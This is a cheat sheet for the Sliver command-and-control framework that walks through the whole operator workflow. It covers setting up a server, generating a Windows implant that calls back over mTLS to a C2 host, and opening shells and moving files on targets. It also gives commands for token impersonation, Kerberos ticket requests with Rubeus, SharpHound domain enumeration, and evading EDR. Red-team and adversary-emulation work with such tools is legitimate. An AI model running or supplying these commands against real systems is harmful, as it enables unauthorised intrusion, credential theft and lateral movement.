# Sliver C2 Cheat Sheet

## 🔹 Overview

Sliver is an open-source Command & Control (C2) framework used for post-exploitation and adversary emulation. It supports encrypted communications (mTLS), implants (beacons), and a wide range of built-in post-exploitation capabilities.

---

# 🔹 Downloading the sliver-server and sliver-client
Both the sliver-server and sliver-client can be downloaded from the [BishopFox/sliver/releases](https://github.com/BishopFox/sliver/releases)
```bash
wget https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-client_linux-amd64
wget https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-server_linux-amd64
```


# 🔹 Starting the Sliver Server

```bash
sudo /opt/sliver-server_linux
```

This starts the Sliver C2 server and opens the interactive console.

---

# 🔹 Enable Multiplayer Mode

```bash
sliver > multiplayer
```

Enables multiple operators to connect to the same server.

---

# 🔹 Add an Operator

```bash
sliver > new-operator --name operator_name --lhost 127.0.0.1 -P all
```

* Generates a client configuration file (`.cfg`)
* Contains certificates for secure communication

---

# 🔹 Initialize Sliver Client

```bash
sliver-client import operator.cfg
sliver-client
```

Connects the operator client to the server using the generated config.

---

# 🔹 Generate an Implant

```bash
sliver > generate --mtls C2-IP:443 --os windows --arch amd64 --format exe --save /tmp/implant.exe
```

* `--mtls`: Mutual TLS encrypted communication
* `--os`: Target OS
* `--arch`: Architecture
* `--format`: Output format (exe, elf, etc.)

---

# 🔹 Start Listener (mTLS)

```bash
sliver > mtls --lhost C2-IP --lport 443
```

Checks for incoming implant connections.

---

# 🔹 Sessions Management

### List sessions:

```bash
sliver > sessions
```

### Interact with a session:

```bash
sliver > use <session_id>
```

### Background session:

```bash
sliver > background
```

### Kill session:

```bash
sliver > sessions -k <session_id>
```

---

# 🔹 Basic Enumeration

```bash
sliver > info
```

Displays:

* Hostname
* Username
* OS version
* Architecture
* Active C2 channel
* Privileges

---

# 🔹 Execute Commands

### Spawn a shell:

```bash
sliver > shell
```

### System enumeration:

```bash
sliver > sa-whoami
```

---

# 🔹 File Transfer

### Download file:

```bash
sliver > download C:\\path\\file.txt file.txt
```

### Upload file:

```bash
sliver > upload local.exe C:\\target\\local.exe
```

---

# 🔹 Process Injection & Execution

### Sideloading:

```bash
sliver > sideload -t 240 tool.exe -cmd "powershell ..."
```

### Execute .NET assemblies:

```bash
sliver > execute-assembly -i -E tool.exe -- args
```

---

# 🔹 Token Impersonation

```bash
sliver > make-token -u username -d domain -p password
```

* Impersonates a user token
* Useful for lateral movement and file access

Revert token:

```bash
rev2self
```

---

# 🔹 Networking & Recon Tools (COFF / Armory)

Sliver includes built-in modules for reconnaissance:

### Examples:

```bash
sa-probe -host TargetIP -port TargetPOrt
sa-netstat
sa-routeprint
sa-netloggedon2
sa-netshares
```

---

# 🔹 Service Enumeration

```bash
sa-sc-qc -- -servicename webclient
```

Used to query Windows services and configurations.

---


# 🔹 Directory Enumeration

```bash
sa-dir -- -targetdir C:\\ProgramData
```

---

# 🔹 Credential & Kerberos Tools

### Rubeus (Kerberos operations):

```bash
rubeus -- asktgt /user:user /rc4:HASH
```

### SharpHound (AD enumeration):

```bash
sharp-hound-4 -s -c all
```

---

# 🔹 Privilege Enumeration

Privileges can be checked via:

```bash
sa-whoami
```

Common privileges:

* SeDebugPrivilege
* SeImpersonatePrivilege
* SeBackupPrivilege

---

# 🔹 Beacon Object Files & Extensions

Sliver supports additional modules via **Armory**.

### Manage modules:

```bash
armory list
armory install <module>
armory install all
armory update
extensions rm <module>
```

---

# 🔹 Common Workflow Summary

1. Start Sliver server
2. Enable multiplayer
3. Add operator
4. Connect client
5. Generate implant
6. Start listener (mtls)
7. Execute implant on target
8. Manage session and pivot

---

# 🔹 Key Concepts

* **Implant**: Payload executed on target
* **Session**: Active connection from implant
* **Beacon**: Periodic callback mode
* **mTLS**: Mutual TLS encryption between server and implant
* **Armory**: Plugin/module system

---

# 🔹 Notes

* Sliver operations are heavily OPSEC-sensitive
* Many built-in tools may trigger EDR/AV
* Use encryption channels (mTLS, HTTPS) for stealth
* Post-exploitation modules help avoid manual tooling

---
